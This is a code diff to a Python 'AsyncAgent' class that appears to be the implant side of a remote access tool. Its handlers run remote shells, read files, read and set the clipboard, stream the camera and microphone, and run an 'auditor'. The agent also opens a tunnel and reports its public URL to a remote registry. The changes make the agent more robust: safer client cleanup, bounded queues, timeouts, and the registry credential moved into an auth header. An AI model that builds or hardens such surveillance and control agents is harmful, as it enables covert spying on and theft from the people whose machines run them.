@@ -158,22 +158,22 @@ class AsyncAgent:
 
         # Send to Direct Clients
         if self.direct_ws_clients and self.loop:
-            failed_clients = []
             for client in list(self.direct_ws_clients):
-                try:
-                    asyncio.run_coroutine_threadsafe(
-                        send_msg(client, msg),
-                        self.loop
-                    )
-                except Exception as e:
-                    print(f"[-] Failed to send to direct client: {e}")
-                    failed_clients.append(client)
-            # Remove failed clients
-            for client in failed_clients:
-                try:
-                    self.direct_ws_clients.discard(client)
-                except Exception:
-                    pass
+                fut = asyncio.run_coroutine_threadsafe(
+                    send_msg(client, msg),
+                    self.loop
+                )
+                # Cleanup on failure safely on the loop
+                def _handle_send_result(f, c=client):
+                    try:
+                        f.result()
+                    except Exception as e:
+                        print(f"[-] Send error: {e}")
+                        # Schedule removal on loop
+                        if self.loop.is_running():
+                            self.loop.call_soon_threadsafe(self.direct_ws_clients.discard, c)
+                
+                fut.add_done_callback(_handle_send_result)
 
     def on_shell_output(self, text):
         self._send_async(protocol.OP_SHELL_OUTPUT, text.encode('utf-8', errors='replace'))
@@ -503,6 +503,11 @@ class AsyncAgent:
                         # Start shell if not running or type changed
                         if (not self.shell_handler.running or 
                             self.shell_handler.current_shell != shell_type):
+                            
+                            # Stop existing if running
+                            if self.shell_handler.running:
+                                await self.loop.run_in_executor(None, self.shell_handler.stop)
+                            
                             # Run in executor to avoid blocking main loop
                             await self.loop.run_in_executor(None, self.shell_handler.start_shell, shell_type)
                             
@@ -556,23 +561,31 @@ class AsyncAgent:
                         if path:
                             # Use executor to avoid blocking event loop
                             async def read_chunks_async(file_path):
-                                queue = asyncio.Queue()
+                                queue = asyncio.Queue(maxsize=10) # Bounded
                                 
                                 def read_worker():
                                     try:
                                         for chunk in self.file_mgr.read_file_chunks(file_path):
-                                            asyncio.run_coroutine_threadsafe(
+                                            future = asyncio.run_coroutine_threadsafe(
                                                 queue.put(chunk), self.loop
-                                            ).result()
+                                            )
+                                            # Wait with timeout to detect dead loop
+                                            try:
+                                                future.result(timeout=5.0)
+                                            except (concurrent.futures.TimeoutError, Exception):
+                                                break
+                                        
                                         # Signal end
-                                        asyncio.run_coroutine_threadsafe(
-                                            queue.put(None), self.loop
-                                        ).result()
+                                        if self.loop.is_running():
+                                            asyncio.run_coroutine_threadsafe(
+                                                queue.put(None), self.loop
+                                            )
                                     except Exception as e:
                                         print(f"[-] FM Read Worker Error: {e}")
-                                        asyncio.run_coroutine_threadsafe(
-                                            queue.put(None), self.loop
-                                        ).result()
+                                        if self.loop.is_running():
+                                            asyncio.run_coroutine_threadsafe(
+                                                queue.put(None), self.loop
+                                            )
                                 
                                 # Start worker thread
                                 threading.Thread(target=read_worker, daemon=True).start()
@@ -641,8 +654,13 @@ class AsyncAgent:
 
                 # CLIPBOARD
                 elif opcode == protocol.OP_CLIP_GET:
-                    text = await self.loop.run_in_executor(None, self.clipboard_handler.get_clipboard)
-                    self._send_async(protocol.OP_CLIP_DATA, text.encode('utf-8'))
+                    try:
+                        text = await self.loop.run_in_executor(None, self.clipboard_handler.get_clipboard)
+                        if text is None: text = ""
+                        self._send_async(protocol.OP_CLIP_DATA, text.encode('utf-8'))
+                    except Exception as e:
+                        print(f"[-] Clip Get Error: {e}")
+                        self._send_async(protocol.OP_CLIP_DATA, b'')
 
                 elif opcode == protocol.OP_CLIP_SET:
                     try:
@@ -845,9 +863,16 @@ class AsyncAgent:
             except Exception as e:
                 print(f"[-] Connection Lost: {e}")
                 # Clean up all state (non-blocking)
+                self.custom_status = None # Reset status
                 self.streaming = False
                 self.cam_streaming = False
                 self.mic_streaming = False
+                
+                # Stop clipboard monitor if running
+                if hasattr(self, 'clipboard_handler'):
+                    try:
+                         self.clipboard_handler.stop_monitoring()
+                    except: pass
                 self.shell_handler.stop()
                 try:
                     await self.loop.run_in_executor(None, self.auditor.stop)
@@ -1042,18 +1067,38 @@ class AsyncAgent:
                 if pub_url:
                     print(f"[+] Tunnel Established: {pub_url}")
                     # 2. Report to Registry
+                    # Validate registry URL scheme
+                    from urllib.parse import urlparse
+                    if urlparse(config.REGISTRY_URL).scheme != 'https':
+                         print("[-] Registry Error: URL must be HTTPS")
+                         return
+
+                    # Use Auth header, not payload
+                    import hashlib
+                    # Pseudonymize ID for logs/privacy
+                    safe_id = hashlib.sha256(self.my_id.encode()).hexdigest()[:8]
+                    
                     payload = {
                         "id": self.my_id,
-                        "password": config.REGISTRY_PASSWORD,
                         "username": config.AGENT_USERNAME,
                         "url": pub_url
                     }
+                    headers = {
+                        "Authorization": f"Bearer {config.REGISTRY_PASSWORD}",
+                        "Content-Type": "application/json"
+                    }
+                    
                     try:
-                        r = requests.post(f"{config.REGISTRY_URL}/update", json=payload, timeout=10)
+                        r = requests.post(
+                            f"{config.REGISTRY_URL}/update", 
+                            json=payload, 
+                            headers=headers,
+                            timeout=10
+                        )
                         if r.status_code == 200:
-                            print(f"[+] Registered with Vercel: {config.REGISTRY_URL}")
+                            print(f"[+] Registered with Registry (ID hash: {safe_id})")
                         else:
-                            print(f"[-] Registry Update Failed: {r.text}")
+                            print(f"[-] Registry Update Failed: {r.status_code}")
                     except Exception as e:
                         print(f"[-] Registry Connect Error: {e}")
                 else:
